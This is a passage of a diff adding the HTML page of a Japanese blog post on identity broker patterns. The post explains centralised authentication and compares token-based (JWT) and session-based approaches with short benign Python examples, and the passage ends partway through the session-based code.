@@ -1,0 +1,1512 @@
+<!DOCTYPE html><html lang="ja"><head><!-- hexo injector head_begin start --><!-- Google tag (gtag.js) begins-->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3DZR3TQYCY"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-3DZR3TQYCY');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+    <meta charset="utf-8">
+    <!-- security headers starts -->
+    <!-- meta http-equiv="content-security-policy" content="script-src 'sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=' 'sha256-lJjk3/dvd+wXqRFjV7T5L/nXJXr5NjUjmsKSPEe+ass=';" -->
+    <!-- security headers ends -->
+    <!-- favicon starts -->    
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <!-- favicon ends -->
+    
+
+    
+    <title>アイデンティティブローカー：分散システムにおける集中認証 | Decoding Digital Anomalies</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="keywords" content="Architecture,Authentication,Security">
+    
+    
+    <meta name="description" content="アイデンティティブローカーは複数のシステムで認証を集中管理しますが、実装の選択はセキュリティ、パフォーマンス、ユーザーエクスペリエンスに影響します。パターン、トレードオフ、落とし穴を理解しましょう。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="アイデンティティブローカー：分散システムにおける集中認証">
+<meta property="og:url" content="https://neo01.com/ja/2021/12/Identity-Broker-Patterns/index.html">
+<meta property="og:site_name" content="Decoding Digital Anomalies">
+<meta property="og:description" content="アイデンティティブローカーは複数のシステムで認証を集中管理しますが、実装の選択はセキュリティ、パフォーマンス、ユーザーエクスペリエンスに影響します。パターン、トレードオフ、落とし穴を理解しましょう。">
+<meta property="og:locale" content="ja_JP">
+<meta property="article:published_time" content="2021-12-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-23T14:57:12.764Z">
+<meta property="article:author" content="Neo Alienson">
+<meta property="article:tag" content="Architecture">
+<meta property="article:tag" content="Authentication">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+    
+            <link rel="alternate" href="/atom.xml" title="Decoding Digital Anomalies" type="application/atom+xml">
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+        
+
+
+    
+    
+        
+
+
+    
+
+<!-- hexo injector head_end start --><link rel="stylesheet" type="text/css" href="/css/bundle.css"><script type="text/javascript" src="/js/bundle_first.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><style id="admonition-styles">.admonition {
+  margin: 1em 0;
+  padding: 0rem;
+  border-left: 0.3rem solid;
+  border-radius: 0.4rem;
+  background-color: #f9f9f9;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
+  overflow: hidden;
+  page-break-inside: avoid;
+}
+
+.admonition-title {
+  display: flex;
+  align-items: center;
+  font-weight: 600;
+  padding: 0rem 1rem 0.1rem 0.75rem;
+  font-size: 1.05em;
+  background-color: rgba(0, 0, 0, 0.03);
+  border-top-left-radius: 0.4rem;
+  border-top-right-radius: 0.4rem;
+  margin: 0 !important;
+}
+
+.admonition-icon {
+  font-size: 1.2em;
+  margin-right: 0.6rem;
+  opacity: 0.85;
+  margin-top: 0.1rem;
+}
+
+/* 内容区域 margin */
+.admonition > *:not(.admonition-title) {
+  margin: 0.6rem 1rem 0.6rem 1rem;
+}
+
+/* NOTE 类型 */
+.admonition.anote {
+  border-color: #448aff;
+}
+.admonition.anote > .admonition-title {
+  background-color: #448aff1a;
+  color: #2962ff;
+}
+
+/* INFO / TODO 类型 */
+.admonition.info,
+.admonition.todo {
+  border-color: #00b8d4;
+}
+.admonition.info > .admonition-title,
+.admonition.todo > .admonition-title {
+  background-color: rgba(0, 184, 212, 0.1);
+  color: #007c91;
+}
+
+/* 警告类 */
+.admonition.warning,
+.admonition.attention,
+.admonition.caution {
+  border-color: #ff9100;
+}
+.admonition.warning > .admonition-title,
+.admonition.attention > .admonition-title,
+.admonition.caution > .admonition-title {
+  background-color: rgba(255, 145, 0, 0.1);
+  color: #c66900;
+}
+
+/* 错误类 */
+.admonition.failure,
+.admonition.missing,
+.admonition.fail,
+.admonition.error,
+.admonition.danger,
+.admonition.bug {
+  border-color: #ff5252;
+}
+.admonition.failure > .admonition-title,
+.admonition.missing > .admonition-title,
+.admonition.fail > .admonition-title,
+.admonition.error > .admonition-title,
+.admonition.danger > .admonition-title,
+.admonition.bug > .admonition-title {
+  background-color: rgba(255, 82, 82, 0.1);
+  color: #b71c1c;
+}
+
+/* TIP 类型 */
+.admonition.tip {
+  border-color: #00bfa5;
+}
+.admonition.tip > .admonition-title {
+  background-color: #00bfa51a;
+  color: #00796b;
+}
+
+/* SUCCESS 类型 */
+.admonition.success {
+  border-color: #00c853;
+}
+.admonition.success > .admonition-title {
+  background-color: #00c8531a;
+  color: #2e7d32;
+}
+
+/* QUESTION 类型 */
+.admonition.question {
+  border-color: #64dd17;
+}
+.admonition.question > .admonition-title {
+  background-color: #64dd171a;
+  color: #558b2f;
+}
+
+/* EXAMPLE 类型 */
+.admonition.example {
+  border-color: #7c4dff;
+}
+.admonition.example > .admonition-title {
+  background-color: #7c4dff1a;
+  color: #512da8;
+}
+
+/* QUOTE 类型 */
+.admonition.quote {
+  border-color: #9e9e9e;
+}
+.admonition.quote > .admonition-title {
+  background-color: #9e9e9e1a;
+  color: #424242;
+}
+
+/*黑暗模式*/
+/* 夜间模式基础样式 */
+[data-theme="dark"] .admonition {
+  background-color: #1e1e1e;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+}
+
+[data-theme="dark"] .admonition-title {
+  background-color: rgba(255, 255, 255, 0.05);
+}
+
+/* anote */
+[data-theme="dark"] .admonition.anote {
+  border-color: #82b1ff;
+}
+[data-theme="dark"] .admonition.anote > .admonition-title {
+  background-color: #82b1ff1a;
+  color: #bbdefb;
+}
+
+/* tip */
+[data-theme="dark"] .admonition.tip {
+  border-color: #64ffda;
+}
+[data-theme="dark"] .admonition.tip > .admonition-title {
+  background-color: #64ffda1a;
+  color: #1de9b6;
+}
+
+/* success */
+[data-theme="dark"] .admonition.success {
+  border-color: #69f0ae;
+}
+[data-theme="dark"] .admonition.success > .admonition-title {
+  background-color: #69f0ae1a;
+  color: #00e676;
+}
+
+/* question */
+[data-theme="dark"] .admonition.question {
+  border-color: #b2ff59;
+}
+[data-theme="dark"] .admonition.question > .admonition-title {
+  background-color: #b2ff591a;
+  color: #aeea00;
+}
+
+/* example */
+[data-theme="dark"] .admonition.example {
+  border-color: #b388ff;
+}
+[data-theme="dark"] .admonition.example > .admonition-title {
+  background-color: #b388ff1a;
+  color: #b39ddb;
+}
+
+/* quote */
+[data-theme="dark"] .admonition.quote {
+  border-color: #bdbdbd;
+}
+[data-theme="dark"] .admonition.quote > .admonition-title {
+  background-color: #bdbdbd1a;
+  color: #eeeeee;
+}
+
+/* warning / attention / caution */
+[data-theme="dark"] .admonition.warning,
+[data-theme="dark"] .admonition.attention,
+[data-theme="dark"] .admonition.caution {
+  border-color: #ffb300;
+}
+[data-theme="dark"] .admonition.warning > .admonition-title,
+[data-theme="dark"] .admonition.attention > .admonition-title,
+[data-theme="dark"] .admonition.caution > .admonition-title {
+  background-color: #ffb3001a;
+  color: #ffe082;
+}
+
+/* error / fail / failure / bug / danger / missing */
+[data-theme="dark"] .admonition.error,
+[data-theme="dark"] .admonition.fail,
+[data-theme="dark"] .admonition.failure,
+[data-theme="dark"] .admonition.bug,
+[data-theme="dark"] .admonition.missing,
+[data-theme="dark"] .admonition.danger {
+  border-color: #ef5350;
+}
+[data-theme="dark"] .admonition.error > .admonition-title,
+[data-theme="dark"] .admonition.fail > .admonition-title,
+[data-theme="dark"] .admonition.failure > .admonition-title,
+[data-theme="dark"] .admonition.bug > .admonition-title,
+[data-theme="dark"] .admonition.missing > .admonition-title,
+[data-theme="dark"] .admonition.danger > .admonition-title {
+  background-color: #ef53501a;
+  color: #ff8a80;
+}</style></head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" title="Homepage" class="logo"></a>
+                    </h1>
+                        <h2 class="subtitle-wrap">
+                            <p class="title">Decoding Digital Anomalies</p>
+                          <p class="subtitle">Sometimes the feature is the bug in the digital rabbit hole, and vice versa</p>
+                        </h2>
+                    <div id="lang-selector">
+                        <span class="lang-icon">🌐</span>
+                        
+                            <a href="/2021/12/Identity-Broker-Patterns/" class="lang-link">English</a>
+<span class="lang-sep">|</span>                            <a href="/zh-TW/2021/12/Identity-Broker-Patterns/" class="lang-link">繁體中文</a>
+<span class="lang-sep">|</span>                            <a href="/zh-CN/2021/12/Identity-Broker-Patterns/" class="lang-link">简体中文</a>
+                    </div>
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/ja/">ホーム</a>
+                                </li>
+                                                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/ja/categories/AI/">AI</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/ja/categories/AI/Art-Gallery/">アートギャラリー</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/ja/categories/Architecture/">アーキテクチャ</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/ja/categories/Cybersecurity/">サイバーセキュリティ</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/ja/categories/Development/">開発</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/ja/categories/Misc/">その他</a></li></ul>
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/ja/about-me">このブログについて</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" id="search-form-input" placeholder="検索">
+        <button type="submit" title="検索" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" id="ins-search-input" placeholder="入力してください">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script integrity="sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=">
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '記事',
+            PAGES: 'ページ',
+            CATEGORIES: 'カテゴリー',
+            TAGS: 'タグ',
+            UNTITLED: '（名称未設定）',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+        LANG: 'ja',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Development/">Development</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-2021/12/Identity-Broker-Patterns-ja" class="article article-single article-type-post" itemscope="" itemprop="blogPost">
+    <div class="article-inner responsive-content">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        アイデンティティブローカー：分散システムにおける集中認証
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+      <i class="fa fa-calendar"></i>
+        
+          Created <time datetime="2021-12-23T16:00:00.000Z" itemprop="datePublished">2021-12-24</time>
+          &nbsp;<i class="fa fa-calendar"></i>
+          Updated <time datetime="2025-10-23T14:57:12.764Z" itemprop="datePublished">2025-10-23</time>
+        
+    </div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/ja/tags/Architecture/">Architecture</a> <a class="tag-link" href="/ja/tags/Security/">Security</a> <a class="tag-link" href="/ja/tags/Authentication/">Authentication</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%A2%E3%82%A4%E3%83%87%E3%83%B3%E3%83%86%E3%82%A3%E3%83%86%E3%82%A3%E3%83%96%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%BC%E3%81%AE%E7%90%86%E8%A7%A3"><span class="toc-text">アイデンティティブローカーの理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%88%E3%83%BC%E3%82%AF%E3%83%B3%E3%83%99%E3%83%BC%E3%82%B9-vs-%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E8%AA%8D%E8%A8%BC"><span class="toc-text">トークンベース vs セッションベースの認証</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%97%E3%83%AD%E3%83%88%E3%82%B3%E3%83%AB%E3%81%AE%E9%81%B8%E6%8A%9E%EF%BC%9AOAuth-2-0%E3%80%81SAML%E3%80%81OpenID-Connect"><span class="toc-text">プロトコルの選択：OAuth 2.0、SAML、OpenID Connect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E3%81%AA%E8%90%BD%E3%81%A8%E3%81%97%E7%A9%B4%E3%81%A8%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E5%95%8F%E9%A1%8C"><span class="toc-text">一般的な落とし穴とセキュリティ問題</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B5%90%E8%AB%96"><span class="toc-text">結論</span></a></li></ol>
+            <p>アイデンティティブローカーは、分散システムにおける認証の拡散問題の解決策として登場しました。各アプリケーションが独自のユーザー資格情報と認証ロジックを管理するのではなく、アイデンティティブローカーがこれらの懸念を集中化し、シングルサインオン（SSO）と統一されたアイデンティティ管理を提供します。しかし、この集中化は新しいアーキテクチャの課題をもたらします：セッション管理の複雑さ、単一障害点、そしてセキュリティとユーザーエクスペリエンスの微妙なバランスです。</p>
+<p>この探求では、エンタープライズシステム、クラウドアプリケーション、マイクロサービスアーキテクチャにおけるアイデンティティブローカーパターンを検証します。一般的な実装アプローチを分析し、OAuth 2.0、SAML、OpenID Connect 間のプロトコル選択を評価し、トークンベースとセッションベースの認証のトレードオフを理解します。実世界の実装とセキュリティインシデントから、アイデンティティブローカーがなぜ不可欠でありながら複雑なのかを明らかにします。</p>
+<h2 id="アイデンティティブローカーの理解">アイデンティティブローカーの理解</h2>
+<p>実装パターンに深く入る前に、アイデンティティブローカーが何をするのか、なぜ存在するのかを理解することが重要です。アイデンティティブローカーはアプリケーションとアイデンティティプロバイダーの間に位置し、認証プロトコルを変換し、ユーザーセッションを管理します。</p>
+<h3 id="核心的な問題：認証の拡散">核心的な問題：認証の拡散</h3>
+<p>アイデンティティブローカーがない場合、各アプリケーションは独立して認証を管理します：</p>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 アイデンティティブローカーがない場合の問題</p><div class="admonition-content"><p><strong>資格情報の重複</strong></p>
+<ul>
+<li>ユーザーは各アプリケーションに個別の資格情報を維持</li>
+<li>システム間でのパスワードの再利用がセキュリティリスクを生む</li>
+<li>パスワードリセットには各アプリケーションへの連絡が必要</li>
+<li>統一されたパスワードポリシーの強制がない</li>
+</ul>
+<p><strong>統合の複雑さ</strong></p>
+<ul>
+<li>各アプリケーションが独自の認証を実装</li>
+<li>アイデンティティプロバイダーとの複数の統合</li>
+<li>一貫性のないセキュリティ実装</li>
+<li>新しいアイデンティティプロバイダーの追加が困難</li>
+</ul>
+<p><strong>ユーザーエクスペリエンスの問題</strong></p>
+<ul>
+<li>ユーザーは各アプリケーションに個別にログイン</li>
+<li>システム間でシングルサインオンがない</li>
+<li>セッション管理の不一致</li>
+<li>ログアウトがアプリケーション間で伝播しない</li>
+</ul>
+</div></div>
+<p>アイデンティティブローカーは、認証ロジックを集中化し、アプリケーションに統一されたインターフェースを提供することで、これらの問題を解決します。</p>
+<h3 id="アイデンティティブローカーが提供するもの">アイデンティティブローカーが提供するもの</h3>
+<p>アイデンティティブローカーは、アプリケーションとアイデンティティプロバイダーの間の仲介者として機能します：</p>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🔑 アイデンティティブローカーの機能</p><div class="admonition-content"><p><strong>プロトコル変換</strong></p>
+<ul>
+<li>アプリケーションは1つのプロトコルを使用（例：OAuth 2.0）</li>
+<li>アイデンティティプロバイダーは異なるプロトコルを使用（SAML、LDAP、OAuth）</li>
+<li>ブローカーがプロトコル間で変換</li>
+<li>アプリケーションはプロバイダー固有のコードが不要</li>
+</ul>
+<p><strong>シングルサインオン（SSO）</strong></p>
+<ul>
+<li>ユーザーはブローカーで一度認証</li>
+<li>ブローカーがアプリケーションにトークン/セッションを発行</li>
+<li>アプリケーションはブローカーの認証を信頼</li>
+<li>複数のアプリケーション間でシームレスなアクセス</li>
+</ul>
+<p><strong>アイデンティティフェデレーション</strong></p>
+<ul>
+<li>複数のアイデンティティプロバイダーを接続</li>
+<li>ユーザーは企業AD、Google、GitHubなどで認証可能</li>
+<li>ブローカーがユーザー属性を正規化</li>
+<li>プロバイダー間で統一されたアイデンティティ</li>
+</ul>
+<p><strong>セッション管理</strong></p>
+<ul>
+<li>集中化されたセッション追跡</li>
+<li>すべてのアプリケーション間でのシングルログアウト</li>
+<li>セッションタイムアウトポリシー</li>
+<li>同時セッション制御</li>
+</ul>
+</div></div>
+<p>人気のあるアイデンティティブローカーには、Keycloak、Auth0、Okta、Azure AD、AWS Cognito があります。</p>
+<h2 id="トークンベース-vs-セッションベースの認証">トークンベース vs セッションベースの認証</h2>
+<p>アイデンティティブローカーは、トークンまたはセッションを使用して認証を実装でき、それぞれ異なるトレードオフがあります。</p>
+<h3 id="トークンベース認証：ステートレスでスケーラブル">トークンベース認証：ステートレスでスケーラブル</h3>
+<p>トークンベース認証は、暗号署名されたトークン（通常はJWT）を使用して認証されたユーザーを表します：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># トークンベース認証フロー</span>
+<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt
+<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta
+
+<span class="token keyword">class</span> <span class="token class-name">TokenAuthBroker</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key
+    
+    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># アイデンティティプロバイダーで資格情報を検証</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># JWTトークンを発行</span>
+            payload <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'iat'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'roles'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>get_user_roles<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+            token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> token
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">validate_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> payload
+        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>JWTError<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+<span class="token comment"># アプリケーションはブローカーに連絡せずにトークンを検証</span>
+<span class="token keyword">def</span> <span class="token function">protected_endpoint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> broker<span class="token punctuation">.</span>validate_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ようこそ </span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> <span class="token string">"未認証"</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ トークンベースの利点</p><div class="admonition-content"><p><strong>ステートレスアーキテクチャ</strong></p>
+<ul>
+<li>サーバー側のセッションストレージが不要</li>
+<li>アプリケーションが独立してトークンを検証</li>
+<li>セッション複製なしで水平スケーリング</li>
+<li>ロードバランサーでセッションアフィニティが不要</li>
+</ul>
+<p><strong>パフォーマンス</strong></p>
+<ul>
+<li>各リクエストでデータベース検索が不要</li>
+<li>検証は暗号署名チェック</li>
+<li>認証チェックのレイテンシが削減</li>
+<li>アイデンティティブローカーへの負荷が低い</li>
+</ul>
+<p><strong>マイクロサービスフレンドリー</strong></p>
+<ul>
+<li>トークンがサービス間で渡される</li>
+<li>共有セッションストアが不要</li>
+<li>サービスが独立してトークンを検証</li>
+<li>疎結合アーキテクチャ</li>
+</ul>
+</div></div>
+<p>しかし、トークンベース認証には重大な欠点があります：</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ トークンベースの課題</p><div class="admonition-content"><p><strong>失効の困難さ</strong></p>
+<ul>
+<li>トークンは有効期限まで有効</li>
+<li>侵害されたトークンを即座に失効できない</li>
+<li>ログアウトが既存のトークンを無効化しない</li>
+<li>トークンブラックリストが必要（ステートレスの利点を損なう）</li>
+</ul>
+<p><strong>トークンサイズ</strong></p>
+<ul>
+<li>JWTにユーザーデータとクレームが含まれる</li>
+<li>各リクエストで送信される</li>
+<li>セッションIDより大きい</li>
+<li>モバイルクライアントの帯域幅オーバーヘッド</li>
+</ul>
+<p><strong>セキュリティリスク</strong></p>
+<ul>
+<li>トークンがブラウザに保存される（XSS脆弱性）</li>
+<li>長期間有効なトークンが露出ウィンドウを増加</li>
+<li>トークン盗難により有効期限まで偽装可能</li>
+<li>リフレッシュトークン管理の複雑さ</li>
+</ul>
+</div></div>
+<h3 id="セッションベース認証：ステートフルだが制御可能">セッションベース認証：ステートフルだが制御可能</h3>
+<p>セッションベース認証は、サーバー側セッションを使用し、セッションIDをクライアントに送信します：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># セッションベース認証フロー</span>
+<span class="token keyword">import</span> secrets
+<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta
+
+<span class="token keyword">class</span> <span class="token class-name">SessionAuthBroker</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>sessions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 本番環境：Redis、データベース</span>
+    
+    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># アイデンティティプロバイダーで資格情報を検証</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># セッションを作成</span>
+            session_id <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>sessions<span class="token punctuation">[</span>session_id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'created'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'expires'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'roles'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>get_user_roles<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">return</span> session_id
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        session <span class="token operator">=</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session_id<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'expires'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> session
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">revoke_session</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 即座に失効</span>
+        <span class="token keyword">if</span> session_id <span class="token keyword">in</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">:</span>
+            <span class="token keyword">del</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">[</span>session_id<span class="token punctuation">]</span>
+            <span class="token keyword">return</span> <span class="token boolean">True</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token comment"># アプリケーションはブローカーでセッションをチェック</span>
+<span class="token keyword">def</span> <span class="token function">protected_endpoint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    session_id <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'session_id'</span><span class="token punctuation">)</span>
